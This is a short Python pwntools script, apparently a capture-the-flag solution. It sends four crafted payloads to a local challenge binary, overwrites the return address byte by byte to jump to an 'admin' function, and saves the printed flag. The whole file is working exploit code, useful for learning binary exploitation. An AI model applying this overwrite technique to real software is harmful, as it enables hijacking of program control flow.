#!/usr/bin/env python
from __future__ import print_function

import pwn
import time

pwn.context.terminal = "tmux splitw -h".split()
pwn.context.arch = "i386"
exe = pwn.context.binary = pwn.ELF('main.elf')
libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

admin_addr = pwn.p32(exe.symbols.admin)

r = pwn.process("./main.elf".split())
#r = pwn.gdb.debug("./main.elf", gdbscript="b* do_stuff+119\nb* do_stuff+190\nc\n")

time.sleep(3)

def get_payload(c, ret_byte_index):
  payload = ""
  payload += c + "\xbb" * 3
  payload += pwn.p32(100)
  payload += pwn.p16(0xc + 4 + ret_byte_index)[:1]
  payload_str = payload.encode("hex")
  pwn.log.info("PAYLOAD[%d]: %s" % (ret_byte_index, "\\x" + "\\x".join(payload_str[i:i+2] for i in range(0, len(payload_str), 2))))
  return payload

for i in range(0, 4):
  r.send(get_payload(admin_addr[i], i))

#r.interactive()

r.recvuntil(">>")

flag = r.recv(timeout=60)
print(flag)
r.close()

f = open("./solution.txt", "w")
f.write(flag)
f.close()

